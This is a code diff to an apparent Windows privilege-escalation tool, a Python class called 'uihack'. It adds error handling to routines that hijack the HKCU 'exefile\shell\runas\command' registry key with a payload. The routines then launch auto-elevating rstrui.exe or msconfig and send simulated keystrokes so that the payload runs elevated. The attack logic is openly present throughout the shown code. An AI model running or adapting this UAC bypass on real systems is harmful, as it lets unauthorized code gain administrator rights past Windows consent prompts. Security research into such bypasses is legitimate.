@@ -124,8 +124,11 @@ class uihack():
 		#
 		if registry().modify_key("hkcu", "Software\\Classes\\exefile\\shell\\runas\\command", None, payload, create=True):
 			print "[Debug] Registry key created"
+		else:
+			print "[Debug] Unable to create registry key"
+			return False
 
-			time.sleep(5)
+		time.sleep(5)
 
 		if uihack().host_process("rstrui.exe", "/RUNONCE"):
 			time.sleep(5)
@@ -142,11 +145,23 @@ class uihack():
 					if uihack().keybd_event(self.VK_RETURN):
 							print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_DOWN)
 							time.sleep(0.30)
+				else:
+					print "[Debug] Unable to set window to foreground, cannot proceed"
+					return False							
+			else:
+				print "[Debug] Unable to locate window, cannot proceed"
+				return False
 
 			time.sleep(5)
 
 			if registry().remove_key("hkcu", "Software\\Classes\\exefile\\shell\\runas\\command", None, delete_key=False):
 				print "[Debug] Registry key restored"
+			else:
+				print "[Debug] Unable to restore registry key"
+				return False
+		else:
+			print "[Debug] Unable to start host process, cannot proceed"
+			return False
 	"""
 
 	def msconfig(self):
@@ -176,5 +191,15 @@ class uihack():
 
 					if uihack().keybd_event(self.VK_RETURN):
 						print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
-						
-uihack().msconfig()						
+				else:
+					print "[Debug] Unable to set window to foreground, cannot proceed"
+					return False
+			else:
+				print "[Debug] Unable to locate window, cannot proceed"
+				return False
+		else:
+			print "[Debug] Unable to start host process, cannot proceed"
+			return False
+
+#uihack().rstrui("c:\\windows\\notepad.exe")
+uihack().msconfig()
